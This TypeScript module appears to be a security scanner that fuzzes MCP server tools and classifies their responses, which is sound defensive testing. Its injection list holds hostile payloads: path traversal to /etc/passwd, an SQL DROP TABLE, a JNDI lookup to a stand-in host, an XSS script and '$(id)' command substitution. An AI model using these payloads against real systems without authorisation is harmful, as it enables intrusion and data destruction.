/**
 * Layer-4 security / adversarial probing (ADR 0003). Given a server's tools, it
 * generates deterministic, schema-driven adversarial inputs — type fuzzing,
 * missing-required, oversized, and a curated injection / path-traversal set — and
 * a runner issues them and classifies each response:
 *
 *   rejected         server refused the bad input (good)
 *   accepted-invalid server ran a schema-violating call (input not validated)
 *   server-error     transport/RPC blew up (poor robustness)
 *   possible-leak    output shows reflected payload or a known sensitive marker
 *
 * Probe GENERATION is pure (`generateProbes`) and classification is pure
 * (`classifyOutcome`); only `runSecurityScan` does I/O — so the rules are unit
 * tested without a network. NOTE: probes call the live server for real.
 */
import type { McpCallResult, McpToolDescriptor } from './types';

export type ProbeKind = 'type-fuzz' | 'missing-required' | 'oversized' | 'injection' | 'empty-args';
export type Classification = 'rejected' | 'accepted-invalid' | 'server-error' | 'possible-leak';
export type Severity = 'high' | 'medium' | 'low';

export interface SecurityProbe {
  readonly kind: ProbeKind;
  readonly toolName: string;
  readonly args: unknown;
  readonly description: string;
  /** For injection probes: the payload string we look for reflected in output. */
  readonly payload?: string;
}

export interface SecurityFinding {
  readonly probe: SecurityProbe;
  readonly classification: Classification;
  readonly severity: Severity;
  readonly detail: string;
}

export interface SecurityReport {
  readonly findings: readonly SecurityFinding[];
  readonly counts: Readonly<Record<Classification, number>>;
  /** Coverage notes (e.g. probes skipped to bound the run). */
  readonly notes: readonly string[];
}

/** Curated string payloads: path traversal, SQLi, template/JNDI, XSS, command sub. */
export const INJECTION_PAYLOADS: readonly string[] = [
  '../../../../etc/passwd',
  "'; DROP TABLE users;--",
  '${jndi:ldap://example.invalid/x}',
  '<script>alert(1)</script>',
  '$(id)',
];

/** Output substrings that strongly suggest a real leak / execution. */
const LEAK_MARKERS: readonly string[] = ['root:x:0:0', 'uid=', '/bin/bash', 'NT AUTHORITY'];

type PropSpec = { type?: string };

function properties(tool: McpToolDescriptor): Record<string, PropSpec> {
  const p = tool.inputSchema['properties'];
  return typeof p === 'object' && p !== null ? (p as Record<string, PropSpec>) : {};
}

function requiredKeys(tool: McpToolDescriptor): string[] {
  const r = tool.inputSchema['required'];
  return Array.isArray(r) ? r.filter((k): k is string => typeof k === 'string') : [];
}

/** A schema-valid sample value for a declared type. */
function sampleValue(type: string | undefined): unknown {
  switch (type) {
    case 'number':
    case 'integer':
      return 1;
    case 'boolean':
      return true;
    case 'array':
      return [];
    case 'object':
      return {};
    default:
      return 'sample';
  }
}

/** A value that violates the declared type (string↔number flip; object otherwise). */
function wrongValue(type: string | undefined): unknown {
  return type === 'string' ? 12345 : 'not-the-right-type';
}

function baselineArgs(props: Record<string, PropSpec>): Record<string, unknown> {
  const args: Record<string, unknown> = {};
  for (const [k, spec] of Object.entries(props)) args[k] = sampleValue(spec.type);
  return args;
}

/** Generate the adversarial probe set for one tool. Pure. */
export function generateProbes(tool: McpToolDescriptor): { probes: SecurityProbe[]; notes: string[] } {
  const props = properties(tool);
  const required = requiredKeys(tool);
  const base = baselineArgs(props);
  const probes: SecurityProbe[] = [];
  const notes: string[] = [];

  probes.push({ kind: 'empty-args', toolName: tool.name, args: {}, description: 'no arguments supplied' });

  for (const key of required) {
    const args = { ...base };
    delete args[key];
    probes.push({ kind: 'missing-required', toolName: tool.name, args, description: `omits required "${key}"` });
  }

  for (const [key, spec] of Object.entries(props)) {
    probes.push({
      kind: 'type-fuzz',
      toolName: tool.name,
      args: { ...base, [key]: wrongValue(spec.type) },
      description: `wrong type for "${key}" (declared ${spec.type ?? 'string'})`,
    });
  }

  const stringKeys = Object.entries(props).filter(([, s]) => (s.type ?? 'string') === 'string').map(([k]) => k);
  const target = stringKeys[0];
  if (target) {
    probes.push({
      kind: 'oversized',
      toolName: tool.name,
      args: { ...base, [target]: 'A'.repeat(100_000) },
      description: `oversized 100k-char value for "${target}"`,
    });
    for (const payload of INJECTION_PAYLOADS) {
      probes.push({
        kind: 'injection',
        toolName: tool.name,
        args: { ...base, [target]: payload },
        description: `injection payload in "${target}": ${payload.slice(0, 24)}`,
        payload,
      });
    }
    if (stringKeys.length > 1) notes.push(`${tool.name}: injection probes applied to "${target}" only (${stringKeys.length - 1} other string field(s) not fuzzed)`);
  } else {
    notes.push(`${tool.name}: no string input — injection/oversized probes skipped`);
  }

  return { probes, notes };
}

/** The observed outcome of running a probe (no I/O here). */
export type ProbeOutcome = { readonly ok: true; readonly result: McpCallResult } | { readonly ok: false; readonly error: string };

/** Classify a probe's outcome into a finding. Pure. */
export function classifyOutcome(probe: SecurityProbe, outcome: ProbeOutcome): SecurityFinding {
  if (!outcome.ok) {
    return { probe, classification: 'server-error', severity: 'medium', detail: `transport/RPC error: ${outcome.error}` };
  }
  const { result } = outcome;
  if (probe.kind === 'injection') {
    const leaked = LEAK_MARKERS.find((m) => result.text.includes(m));
    if (!result.isError && leaked) {
      return { probe, classification: 'possible-leak', severity: 'high', detail: `output contains sensitive marker "${leaked}"` };
    }
    if (!result.isError && probe.payload && result.text.includes(probe.payload)) {
      return { probe, classification: 'possible-leak', severity: 'medium', detail: 'payload reflected verbatim in output' };
    }
    return result.isError
      ? { probe, classification: 'rejected', severity: 'low', detail: 'server rejected the injection input' }
      : { probe, classification: 'rejected', severity: 'low', detail: 'no leak detected in output' };
  }
  // Schema-violating probes (type-fuzz / missing-required / oversized / empty):
  // a clean success means the server did not validate its input.
  if (result.isError) {
    return { probe, classification: 'rejected', severity: 'low', detail: 'server rejected the malformed input' };
  }
  return { probe, classification: 'accepted-invalid', severity: 'medium', detail: 'server accepted schema-violating input without error' };
}

/** Minimal surface the scan needs — `McpClient` satisfies it. */
export interface ToolCaller {
  callTool(name: string, args: unknown): Promise<McpCallResult>;
}

const EMPTY_COUNTS: Record<Classification, number> = { rejected: 0, 'accepted-invalid': 0, 'server-error': 0, 'possible-leak': 0 };

/** Run the full adversarial scan against a live server. Issues real tool calls. */
export async function runSecurityScan(caller: ToolCaller, tools: readonly McpToolDescriptor[]): Promise<SecurityReport> {
  const findings: SecurityFinding[] = [];
  const notes: string[] = [];
  const counts: Record<Classification, number> = { ...EMPTY_COUNTS };

  for (const tool of tools) {
    const { probes, notes: toolNotes } = generateProbes(tool);
    notes.push(...toolNotes);
    for (const probe of probes) {
      const outcome = await runProbe(caller, probe);
      const finding = classifyOutcome(probe, outcome);
      findings.push(finding);
      counts[finding.classification] += 1;
    }
  }
  return { findings, counts, notes };
}

async function runProbe(caller: ToolCaller, probe: SecurityProbe): Promise<ProbeOutcome> {
  try {
    return { ok: true, result: await caller.callTool(probe.toolName, probe.args) };
  } catch (err) {
    return { ok: false, error: err instanceof Error ? err.message : String(err) };
  }
}
